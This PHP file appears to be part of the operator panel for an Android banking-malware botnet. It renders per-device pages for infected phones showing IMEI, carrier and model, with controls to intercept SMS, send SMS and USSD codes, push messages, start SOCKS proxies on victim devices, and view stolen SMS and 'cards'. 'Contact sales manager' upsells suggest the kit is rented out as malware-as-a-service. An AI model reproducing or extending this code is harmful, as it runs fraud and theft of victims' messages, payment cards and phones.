<?php
require_once("../dbget.php");
function get_bot_coment ($botid)
{
    global $link;
    
    $botid = mysql_real_escape_string ($botid, $link);
    
    $query = "select `comment` from `bots` where `botid` = '$botid'";
    
    $res = mysql_query($query, $link);
    
    if ($res)
    {
        $row = mysql_fetch_assoc($res);
        
        $result = '<div class="col-md-8">'
                . '<input class="form-control" id="botinfo-comment" size="40" '
                . 'placeholder="Comment" type="text" value="'.$row['comment'].'">'
                . '</input></div>'
                . '<div class="col-md-2">'
                . '<button class="btn btn-sm" id="botinfo-comment-send">Set comment</button>'
                . '</div>'
                . '<div class="col-md-2"></div>';
        
        return $result;
    }
    else return mysql_error($link);
}

function get_bot_number ($botid)
{
    global $link;

    $botid = mysql_real_escape_string ($botid, $link);

    $query = "select `number` from `bots` where `botid` = '$botid'";

    $res = mysql_query($query, $link);

    if ($res)
    {
        $row = mysql_fetch_assoc($res);

        $result = '<div class="col-md-8">'
            . '<input class="form-control" id="botinfo-number" size="40" '
            . 'placeholder="Number" type="text" value="'.$row['number'].'">'
            . '</input></div>'
            . '<div class="col-md-2">'
            . '<button class="btn btn-sm" id="botinfo-number-send">Set number</button>'
            . '</div>'
            . '<div class="col-md-2"></div>';

        return $result;
    }
    else return mysql_error($link);
}

function get_intercept_cell ($value)
{
    $result = '<span id="botinfo-intercept">';
    $result.= ($value == '1') ? 'ON' : 'OFF';
    $result.= '</span>';
    
    return $result;
}

function get_sms_admin_cell ($value)
{
    $result = '<span id="botinfo-sms_admin">';
    $result.= ($value == '1') ? 'YES' : 'NO (Contact sales manager to know more)';
    $result.= '</span>';
    
    return $result;
}

function get_admin_cell($value)
{
    $result = '<span id="botinfo-is_admin">';
    $result.= ($value == '1') ? 'YES' : 'NO';
    $result.= '</span>';
    
    return $result;
}

function get_rent_cell ($value)
{
    $result = '<span id="botinfo-rent">';
    $result.= ($value == '1') ? 'ON' : 'OFF';
    $result.= '</span>';

    return $result;
}

function get_bot_details ($botid)
{
    global $link;
    
    $botid = mysql_real_escape_string ($botid, $link);
    
    $query = <<<SQL
        select
        `bots`.`timestamp`,
        `bots`.`imei`,
        `bots`.`country`,
        `bots`.`cell`,
        `bots`.`android`,
        `bots`.`model`,
        `bots`.`result`,
        `bots`.`is_intercept`,
        `bots`.`is_rent`,
        `bots`.`command`,
        `bots`.`run_commands`,
		`bots`.`lastip`,
		`bots`.`is_sms_default_app`,
		`bots`.`is_admin`,
		`bots_tracking`.`id` AS `track_id`,
        `general`.`socks`.`status` as `socks_status`,
        `general`.`socks`.`is_online` as `socks_online`
        from `bots`
LEFT JOIN `bots_tracking` ON `bots_tracking`.`bot_id`   = `bots`.`botid`
LEFT JOIN `general`.`socks` on `general`.`socks`.`botid`  = `bots`.`botid`
        where `bots`.`botid` = '{$botid}'
SQL;

    $res = mysql_query($query, $link);
    
    $arr = array ();
    
    if ($res)
    {
        $row = mysql_fetch_assoc($res);
        
        $arr[] = array ('ID', $botid);
        
        $arr[] = array ('IMEI:', $row['imei']);
        $arr[] = array ('Country:', get_country_cell($row['country']));
        $arr[] = array ('Operator:', $row['cell']);
        $arr[] = array ('Android version:', $row['android']);
        $arr[] = array ('Model:', $row['model']);
        
        $arr[] = array ('Last result:', $row['result']);
        if ($row['track_id']==NULL) {
            $arr[] = array ('Timestamp:', $row['timestamp']. "<div class=\"col-md-2\"><button class=\"tracking-button\" data-type=\"bots\" data-botid=\"" . $botid . "\">Track (Jabber)</button></div>");

        }
        else
        {
            $arr[] = array ('Timestamp:', $row['timestamp']);
        }

            $arr[] = array('Command:', $row['command']);
        $arr[] = array ('Intercept:', get_intercept_cell ($row['is_intercept']));
        $arr[] = array ('Is admin:', get_admin_cell($row['is_admin']));
        $arr[] = array ('SMS delete feature:', get_sms_admin_cell($row['is_sms_default_app']));
        
        $commands = array();
        
        if($row['run_commands']) {
            $elems = json_decode(base64_decode($row['run_commands']), true);
            if($elems)
				foreach($elems as $command) {
					$commands[] = json_encode($command);
				}
        
        }        
        
        $arr[] = array ('Run commands:', implode("<br>", $commands));   
		$arr[] = array ('Last update from:', $row['lastip']);

        $folder = explode("/", $_SERVER['REQUEST_URI'])[1];
        $json_path = "../../../clients/{$folder}/bot/client_cfg.json";

        $client_cfg = json_decode(file_get_contents($json_path), true);

        $icon_color = "F50808";
        if (isset($client_cfg['mod_socks']) && $client_cfg['mod_socks']){

            $hint = "offline";
            $button_param = "start";
            if ($row["socks_online"]){
                $icon_color = "5CD726";
                $button_param = "stop";
                $hint = "online";
            }


            $icon = "<div style=\"display: inline-block;width: 14px;height: 14px;border-radius: 50%;background-color: #$icon_color\" title=\"$hint\"></div>";
            $button_text = $row["socks_online"] ? "Stop" : "Start";

            $socks_status =  "Offline";
            if ($row["socks_status"]){
                $socks_status = $row["socks_status"];
                if (isset($_SERVER["HTTP_X_FORWARDED_HOST"]))
                    $socks_status = str_replace("{{HOSTNAME}}", $_SERVER["HTTP_X_FORWARDED_HOST"], $socks_status);
                else
                    $socks_status = str_replace("{{HOSTNAME}}", $_SERVER["REMOTE_ADDR"], $socks_status);
            }
            $arr[] = array("Socks status", "$icon&nbsp;$socks_status&nbsp;<div class='col-md-2'><button class='socks-button' data-botid='$botid' data-param='$button_param'>$button_text</button></div>");
        }
        else {
            $arr[] = array("Socks status", "<div style=\"display: inline-block;width: 14px;height: 14px;border-radius: 50%;background-color: #$icon_color\"></div> OFF (Contact sales manager to know more)");   
        }
        
    }
    else{ 
		$err = mysql_error($link);
		echo $err;
		return $err;
	}
    
    return get_table_view(2, $arr);
}

function get_send_command ($botid)
{
    $arr = array ();
    
    $arr[] = '<form id="send-command-form"></form>'
           . '<input type="text" form="send-command-form"'
           . ' id="send-command-command" size="40"></input>';
    $arr[] = '<input type="text" form="send-command-form"'
           . ' id="send-command-params" size="40"></input>';
    $arr[] = '<button onclick="onSendCommand('."'$botid'".');">Send</button>';
    $arr[] = '<span id="send-command-status"></span>';
    
    $arr = array ($arr);
    
    return get_table_view(4, $arr,
            array ('Command', 'Password', '', ''));
}

function get_send_sms ($botid)
{
    $arr = array ();
    
    $arr[] = '<form id="send-sms-form"></form>'
           . '<input type="text" form="send-sms-form"'
           . ' id="send-sms-number" size="14"></input>';
    $arr[] = '<input type="text" form="send-sms-form"'
           . ' id="send-sms-body" size="80"></input>';
    $arr[] = '<button onclick="onSendSMS('."'$botid'".');">Send</button>';
    $arr[] = '<span id="send-sms-status"></span>';
    
    $arr = array ($arr);
    
    return get_table_view(4, $arr,
            array ('Number', 'Body', '', ''));
}

function get_send_ussd ($botid)
{
    $arr = array ();
    
    $arr[] = '<form id="send-ussd-form"></form>'
           . '<input type="text" form="send-ussd-form"'
           . ' id="send-ussd-number" size="40"></input>';
    $arr[] = '<button onclick="onSendUSSD('."'$botid'".');">Send</button>';
    $arr[] = '<span id="send-ussd-status"></span>';
    
    $arr = array ($arr);
    
    return get_table_view(3, $arr,
            array ('Number', '', ''));
}

function get_send_delivery ($botid)
{
    $arr = array ();
    
    $arr[] = '<form id="send-delivery-form"></form>'
           . '<input type="text" form="send-delivery-form"'
           . ' id="send-delivery-body" size="60"></input>';
    $arr[] = '<button onclick="onSendDelivery('."'$botid'".');">Send</button>';
    $arr[] = '<span id="send-delivery-status"></span>';
    
    $arr = array ($arr);
    
    return get_table_view(3, $arr,
            array ('Body', '', ''));
}

function get_intercept ($botid)
{
    global $link;
    
    $botid = mysql_real_escape_string($botid, $link);
    $query = "select `is_intercept` from `bot_table` where `bot_id` = '$botid'";
    
    $is_intercept = db_query_value($query);
    
    $button = '<button onclick="onToggleIntercept('."'$botid'";
    
    if ($is_intercept) $button .= ', false);">Intercept OFF</button>';
    else $button .= ', true);">Intercept ON</button>';
 
    $arr = array (array ($button, '<span id="toggle-intercept-status"></span>'));
    
    return get_table_view (4, $arr);
}

function get_extra_botinfo ($botid)
{
    $arr = array ();
    
    $arr[] = '<a href="index.php?view=sms&botid='.$botid.'">Show SMS</a>';
    $arr[] = '<a href="index.php?view=cards&botid='.$botid.'">Show cards</a>';
    
    return get_table_view(count ($arr), array ($arr));
}

function get_botinfo_view ($botid)
{
    $content = get_bot_details ($botid);
    $caption = "Bot Details";
    $result = get_infoblock ($caption, $content);
    
    $content = get_bot_coment ($botid);
    $caption = "Bot Comment";
    $result.= get_infoblock($caption, $content);

    $content = get_bot_number ($botid);
    $caption = "Bot Number";
    $result.= get_infoblock($caption, $content);


    return $result;
}

function set_comment ($botid, $comment)
{
    global $link;
    
    $botid   = mysql_real_escape_string ($botid,   $link);
    $comment = mysql_real_escape_string ($comment, $link);
    
    $query = "update `bots` set `comment` = '$comment'"
           . "where `botid` = '$botid'";
    
    $res = mysql_query ($query);
    
    if ($res) return "OK";
    else return "ERR " . mysql_error($link);
}

function set_number ($botid, $number)
{
    global $link;

    $botid   = mysql_real_escape_string ($botid,   $link);
    $number = mysql_real_escape_string ($number, $link);

    $query = "update `bots` set `number` = '{$number}'"
        . "where `botid` = '$botid'";

    $res = mysql_query ($query);

    if ($res) return "OK";
    else return "ERR " . mysql_error($link);
}

?>
